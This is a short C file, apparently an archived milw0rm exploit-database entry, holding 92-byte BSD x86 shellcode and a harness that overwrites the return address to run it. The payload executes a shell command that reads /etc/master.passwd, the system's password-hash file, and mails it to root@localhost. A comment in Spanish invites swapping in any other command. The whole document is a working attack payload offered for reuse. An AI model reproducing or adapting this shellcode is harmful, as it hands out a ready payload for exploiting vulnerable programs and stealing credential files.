/*
   *BSD version
   FreeBSD, OpenBSD, NetBSD.

   s0t4ipv6@shellcode.com.ar

   92 bytes.

   _execve(/bin/sh -c "/bin/cat /etc/master.passwd|mail root@localhost");
   pueden reemplzar el comando por lo que se les ocurra.
*/

char shellcode[]=

    "\xeb\x25"             /* jmp     <shellcode+39>         */
    "\x59"                 /* popl    %ecx                   */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68\x6e\x2f\x73\x68" /* push    $0x68732f6e            */
    "\x68\x2f\x2f\x62\x69" /* push    $0x69622f2f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x66\x68\x2d\x63"     /* pushw   $0x632d                */
    "\x89\xe7"             /* movl    %esp,%edi              */
    "\x50"                 /* pushl   %eax                   */
    "\x51"                 /* pushl   %ecx                   */
    "\x57"                 /* pushl   %edi                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe7"             /* movl    %esp,%edi              */
    "\x50"                 /* pushl   %eax                   */
    "\x57"                 /* pushl   %edi                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x50"                 /* pushl   %eax                   */
    "\xb0\x3b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
    "\xe8\xd6\xff\xff\xff" /* call    <shellcode+2>          */
    "/bin/cat /etc/master.passwd|mail root@localhost";

main()
{
   int *ret;
   printf("Shellcode lenght=%d\n",sizeof(shellcode));
   ret=(int*)&ret+2;
   (*ret)=(int)shellcode;
}

// milw0rm.com [2004-09-26]